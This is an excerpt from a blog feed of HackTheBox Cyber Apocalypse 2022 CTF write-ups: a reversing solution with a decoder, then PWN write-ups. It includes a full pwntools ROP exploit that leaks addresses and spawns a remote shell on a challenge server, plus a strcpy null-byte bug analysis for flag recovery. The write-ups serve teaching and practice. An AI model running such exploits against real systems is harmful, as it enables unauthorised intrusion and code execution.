</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_28</span> <span class="o">=</span> <span class="n">local_28</span> <span class="o">^</span> <span class="n">local_40</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="n">local_20</span><span class="p">;</span> <span class="n">local_20</span> <span class="o">=</span> <span class="n">local_20</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_28</span> <span class="o">=</span> <span class="o">-</span><span class="p">(</span><span class="n">local_28</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xedb88320</span> <span class="o">^</span> <span class="n">local_28</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="nf">swap_bytes</span><span class="p">((</span><span class="n">ulong</span><span class="p">)</span><span class="o">~</span><span class="n">local_28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uVar1</span> <span class="o">|</span> <span class="o">~</span><span class="n">local_28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>During the CTF, I did not reverse the whole thing:</p>
<p>we know that the first 8 bytes of the file are the initial key, we can just patch the file to read the key from a user controlled file instead of /dev/urandom&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># poor man&#39;s patch ....</span>
</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;indefinite.patch&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;indefinite&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/dev/urandom&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;keyfile_1111&#34;</span><span class="p">))</span>
</span></span></code></pre></div><p>and then</p>
<pre tabindex="0"><code># read seed from encrypted file and write it to keyfile_1111
% dd if=flag.txt.enc bs=1 count=8 of=keyfile_1111
8+0 records in
8+0 records out
8 bytes copied, 0.000346225 s, 23.1 kB/s

# read encrypted content (after the key) and write it to flag file
% dd if=flag.txt.enc bs=1 skip=8 of=flag
212+0 records in
212+0 records out
212 bytes copied, 0.000657295 s, 323 kB/s


# &#39;encrypt&#39; the file
% ./indefinite.patch flag

# profit
% cat flag.enc                
^�($����At 3730 Galactic Time, we will convene at our outpost the Phey forest, 4 miles from the Annara defense systems. Remember, the password for the bunker door is HTB{unr4v3ll1ng_th3_c0d3,unp4ck1ng_th3_s3cr3t}.
�35+��U%                                                                    
</code></pre><p>For the sake of completeness here&rsquo;s a python decoder:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">xor</span><span class="p">,</span> <span class="n">p32</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BLOCK_SIZE</span> <span class="o">=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">blocks</span><span class="o">=</span> <span class="p">[</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">BLOCK_SIZE</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">BLOCK_SIZE</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">advance</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">crc</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">zlib</span><span class="o">.</span><span class="n">crc32</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">crc</span> <span class="o">+</span> <span class="n">crc</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">advance</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">+=</span> <span class="n">xor</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python dec.py flag.txt.enc
b&#39;At 3730 Galactic Time, we will convene at our outpost the Phey forest, 4 miles from the Annara defense systems. Remember, the password for the bunker door is HTB{unr4v3ll1ng_th3_c0d3,unp4ck1ng_th3_s3cr3t}.\n\xcb\x1335+\x8d\xa6tj\x18&#39;
</code></pre>]]></content>
		</item>
		
		<item>
			<title>HackTheBox CTF Cyber Apocalypse 2022: Intergalactic Chase (PWN)</title>
			<link>https://matth.dmz42.org/posts/2022/hackthebox-ctf-cyber-apocalypse-2022-intergalactic-chase-pwn/</link>
			<pubDate>Fri, 20 May 2022 10:01:40 +0200</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2022/hackthebox-ctf-cyber-apocalypse-2022-intergalactic-chase-pwn/</guid>
			<description>Hack The Box was hosting a CTF event and we played together with some friends.
Here are some writeups for some of the PWN challenges i solved.
Any code you can find here is very low ctf quality :)
0. TOC Space pirate: Retribution
Vault Breaker
Fleet Management
Hellbound
Trick Or Deal
1. Space pirate: Retribution Original files are here.
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled RUNPATH: b&amp;#39;.</description>
			<content type="html"><![CDATA[<p><a href="https://www.hackthebox.com">Hack The Box</a> was hosting a CTF event and we played together with some friends.</p>
<p>Here are some writeups for some of the PWN challenges i solved.</p>
<p>Any code you can find here is very low ctf quality :)</p>
<h1 id="0-toc">0. TOC</h1>
<ol>
<li>
<p><a href="#1-space-pirate-retribution">Space pirate: Retribution</a></p>
</li>
<li>
<p><a href="#2-vault-breaker">Vault Breaker</a></p>
</li>
<li>
<p><a href="#3-fleet-management">Fleet Management</a></p>
</li>
<li>
<p><a href="#4-hellbound">Hellbound</a></p>
</li>
<li>
<p><a href="#5-trick-or-deal">Trick Or Deal</a></p>
</li>
</ol>
<h1 id="1-space-pirate-retribution">1. Space pirate: Retribution</h1>
<p>Original files are <a href="pwn_sp_retribution.zip">here</a>.</p>
<pre tabindex="0"><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b&#39;./glibc/&#39;
</code></pre><p>The binary is PIE we need to leak its base, it also has full RELRO so overwritting a GOT entry is not an option.</p>
<p>The <code>missile_launcher</code> function is vulnerable:</p>
<ul>
<li>it leaks the binary base via a stack variable</li>
<li>there&rsquo;s a buffer overflow</li>
</ul>
<p>The goal here is:</p>
<ul>
<li>leak binary base</li>
<li>exploit the overflow to leak a libc address via the GOT</li>
<li>system(&quot;/bin/sh&quot;)</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">local_path</span> <span class="o">=</span> <span class="s2">&#34;sp_retribution&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pty</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">PTY</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">local_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;glibc/libc-2.23.so&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="n">rem</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">rem</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;138.68.188.223&#34;</span><span class="p">,</span> <span class="mi">30195</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">pty</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">pty</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">io</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_rip_offset</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">corefile</span>
</span></span><span class="line"><span class="cl">    <span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="o">.</span><span class="n">rsp</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="s2">&#34;rsp = </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="s2">&#34;cyclic pattern = </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pattern</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">rip_offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="s2">&#34;rip offset is = </span><span class="si">%d</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">rip_offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rip_offset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#io = init()</span>
</span></span><span class="line"><span class="cl"><span class="c1">#offset = find_rip_offset(io)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io.close()</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">88</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># leak</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">init</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;y = &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;(y/n): &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># leak base elf addr</span>
</span></span><span class="line"><span class="cl"><span class="c1">#base = u32(re.findall(b&#34;y = \n\r(.*?)\n&#34;, data)[0]) &lt;&lt; 16</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">base</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;leaked base: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000000000000d33</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">offset</span>
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">pop_rdi_ret</span><span class="p">)</span>                <span class="c1"># load got.read into rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>               <span class="c1"># leak it</span>
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">missile_launcher</span><span class="p">)</span>   <span class="c1"># go back to vuln function</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># send stage1</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level = &#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># read leaked address</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;eset!</span><span class="se">\x1b</span><span class="s2">[1;34m</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_read</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;leaked read add: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_read</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># compute some offset, easy game we have a copy of the libc</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_read</span> <span class="o">-</span> <span class="mh">0xb1fb0</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_read</span> <span class="o">+</span> <span class="mh">0x95b07</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># play again</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;y = &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;(y/n): &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># system(/bin/sh)</span>
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">offset</span>
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">pop_rdi_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;shell...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python pwn_retribution.py
[+] Opening connection to 138.68.188.223 on port 30195: Done
leaked base: 0x55d80eab0000
leaked read add: 0x7f893c52b350
shell...
[*] Switching to interactive mode

[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!
$ id
uid=100(ctf) gid=101(ctf)
$ cat flag.txt
HTB{d0_n0t_3v3R_pr355_th3_butt0n}
$
[*] Interrupted
[*] Closed connection to 138.68.188.223 port 30195
</code></pre><h1 id="2-vault-breaker">2. Vault Breaker</h1>
<p>Original files are <a href="pwn_vault_breaker.zip">here</a>.</p>
<p>The binary reads a 32 bytes random key:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="n">__stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span><span class="s">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">__fd</span> <span class="o">=</span> <span class="nf">fileno</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">__fd</span><span class="p">,</span><span class="n">random_key</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
</span></span></code></pre></div><p>then output the flag xored with the random key</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="nf">fwrite</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Master password for Vault: &#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">i_</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">flagstr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&lt;=</span> <span class="n">i_</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">putchar</span><span class="p">((</span><span class="kt">int</span><span class="p">)(</span><span class="kt">char</span><span class="p">)(</span><span class="n">random_key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">flagstr</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>we have the option to generate a new random key of given size before dumping the xored flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="n">__stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span><span class="s">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mh">0x1f</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[*] Length of new password (0-%d): &#34;</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="nf">read_num</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">fileno</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">buff</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(;</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">buff</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">fd</span> <span class="o">=</span> <span class="nf">fileno</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">buff</span> <span class="o">+</span> <span class="n">n</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* includes trailing NULL byte */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">random_key</span><span class="p">,</span><span class="n">buff</span><span class="p">);</span>
</span></span></code></pre></div><p>If we request a new key of size 8, it will replace the first 8 bytes of the random_key by new random bytes.</p>
<p>The bug is that it&rsquo;s using strcpy, which will also copy the trailing NULL byte.</p>
<pre tabindex="0"><code>before strcpy, original key:

pwndbg&gt; x/32bx 0x555555606060
0x555555606060 &lt;random_key&gt;:	0x8a	0x3a	0x46	0x49	0x61	0x31	0xe8	0xb3
0x555555606068 &lt;random_key+8&gt;:	0x5a	0x11	0xf9	0xb5	0x93	0x93	0xb8	0xd5
0x555555606070 &lt;random_key+16&gt;:	0xff	0xc3	0xaa	0xc2	0xef	0xef	0x22	0xdd
0x555555606078 &lt;random_key+24&gt;:	0x04	0x2c	0x87	0xe8	0x3e	0xc0	0xab	0x12


after strcpy:
pwndbg&gt; x/32bx 0x555555606060
0x555555606060 &lt;random_key&gt;:	0x34	0x7e	0x37	0xf6	0xab	0x41	0x4c	0x36
0x555555606068 &lt;random_key+8&gt;:	0x00	0x11	0xf9	0xb5	0x93	0x93	0xb8	0xd5
0x555555606070 &lt;random_key+16&gt;:	0xff	0xc3	0xaa	0xc2	0xef	0xef	0x22	0xdd
0x555555606078 &lt;random_key+24&gt;:	0x04	0x2c	0x87	0xe8	0x3e	0xc0	0xab	0x12

8 new first bytes, and a NULL byte at random_key+8
</code></pre><ul>
<li>new key of size 0: random_key[0] = 0</li>
<li>new key of size 1: random_key[1] = 0</li>
<li>new key of size 2: random_key[2] = 0</li>
</ul>
<p>etc&hellip;</p>
<p>since the flag is xor&rsquo;d with the key and flag ^ 0 == flag, we can leak the flag byte by byte&hellip;</p>
